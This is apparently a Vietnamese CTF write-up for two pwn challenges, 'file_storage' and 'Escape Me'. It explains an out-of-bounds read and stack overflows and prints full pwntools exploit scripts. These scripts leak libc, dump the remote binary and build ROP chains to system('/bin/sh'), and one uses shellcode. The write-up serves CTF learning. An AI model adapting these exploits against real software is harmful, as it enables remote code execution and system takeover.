## file_storage

Ở bài này, tác giả cho ta source code của file `file_storage.c`, tuy nhiên thì không có binary, do đó ta không biết được các compile flag (stack canary, PIE, ...) mà binary trên remote server sử dụng là gì. Sau khi audit một tí thì ta để ý thấy 2 bug:
- Một bug buffer overflow khá rõ ràng ở hàm `feedback`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/05b0cac2-f645-4c58-b7eb-d7cabd1368b1)

- Một bug out-of-bound read xảy ra do ta có thể nhập số âm vào tham số `offset` khi thực hiện đọc file

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/70418781-daf2-46a3-8304-7a3c3e904c19)

Nếu độ dài của file nhỏ `4096` thì sẽ được lưu tạm ở .bss segment trong biến `fixed`, từ đó ta kết luận được trên remote thì binary sẽ được compile với Partial RELRO/No RELRO vì nếu không thì phần buffer này sẽ bị read-only. Nếu độ dài của file lớn hơn thì nó sẽ được allocate lên heap, lợi dụng điều này ta có thể thông qua heap để leak các pointer đến libc trên heap.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/df60c7bc-72c5-4902-9dae-75736b00a6b5)

Để làm được như thế thì ta phải có một file có độ dài lớn, may mắn trên remote tác giả đã cho ta 2 file `4k` và `8k` chứa lần lượt 4000 và 8000 nullbyte

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/af5922a7-3f3a-474c-b0a6-bfc986c0b73f)

Hai địa chỉ mà ta leak được của libc lần lượt là của `_IO_2_1_stderr_` và `_IO_wfile_jumps`, ta sẽ tìm vài trang libc database để search offset và tìm xem libc version mà remote đang sử dụng là gì

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9923a0cf-e891-42b8-b07c-52a86db3e0df)

Vậy là ta xác định được bài dùng glibc 2.31, giờ thì ta có thể dùng libc để ROP bằng bug buffer overflow ban đầu. Tuy nhiên để chắc chắn, ta cần xác định xem binary trên server có sử dụng stack canary hay không, ta có thể dùng bug out-of-bound read khi nãy để read từ .bss segment ngược về code segment, sau đó dùng capstone engine để check assembly và xem binary có gọi đến fs segment hay gọi đến `__stack_chk_fail` không

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0392e061-ff02-49f9-8aa9-43c0eefc4f30)

Sau khi đọc qua, ta xác định là server không có canary, lúc này thì mạnh dạn ROP thôi

```py
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))


io.sendlineafter(b"> ", b"exit")
io.sendline(b"A"*264 + p64(libc.address + pop_rdi + 1) + p64(libc.address + pop_rdi) + p64(sh) + p64(libc.sym["system"]))

io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f445a504-547a-4ee0-b645-d67a365bd3c4)

## Escape Me

Bài này thực hiện tạo một sandbox process bằng fork, sau đó sử dụng seccomp filter để ngăn ta sử dụng các syscall ngoại trừ `read`, `write`, `fstat`, `exit_group`, `mmap`, `munmap`, `mprotect` và cho ta chạy shellcode trên process đó. Ban đầu ta nghĩ đây là một bài syscall bypass, tuy nhiên nếu để ý kỹ thì có một bug buffer overflow xảy ra khi hàm `broker_process` nhận output được trả về từ shellcode của ta

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/713c4d82-23d6-42bd-9045-1a201578ba5b)

Challenge thực hiện `mmap` ra một vùng nhớ và gắn với để cho shellcode ghi output vào với 4 byte đầu sẽ là length của output và còn lại là data, ở đây ta có thể control `out_sz` tùy ý, từ đó dẫn tới stack-based buffer overflow. VÌ bài này cũng không cho ta biết libc, nên ta sẽ leak libc thông qua GOT, sau đó dùng cách tương tự bài `file_storage` để xác định libc và cuối cùng là trả về data để overflow biến `output` và thực hiện ROP để control RIP.

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack, asm

if args.REMOTE:
    io = remote("escape_me.pwnable.vn", 31338)
    pop_rdi = 0x2a3e5
    system = 0x50d60
    sh = 0x1d8698
    read_offset = 0x114980
else:
    io = process("./escape_me")
    pop_rdi = 0x2a3e5
    system = 0x50d70
    sh = 0x1d8678
    read_offset = 0x1147d0

shellcode = asm(f"""
    mov r11, 0x404080
    mov r11, [r11]
    sub r11, {read_offset}
    mov r15, r11
    mov rax, 0
    lea rsi, [rdi+4]
    mov r11, 1000
    mov [rdi], r11
    lea rbx, [rsi+rax*8]
    mov r13, 0x4141414141414141
    mov [rbx], r13
    add rax, 1
    cmp rax, 32
    jle $-25
    lea r11, [r15+{pop_rdi+1}]
    mov [rsi+33*8], r11
    lea r11, [r15+{pop_rdi}]
    mov [rsi+34*8], r11
    lea r11, [r15+{system}]
    mov [rsi+36*8], r11
    lea r11, [r15+{sh}]
    mov [rsi+35*8], r11
    ret
""", arch = 'amd64', os = 'linux')


pause()
io.sendlineafter(b">", b"1")
io.sendline(str(len(shellcode)).encode())
io.send(shellcode)

io.interactive()
```
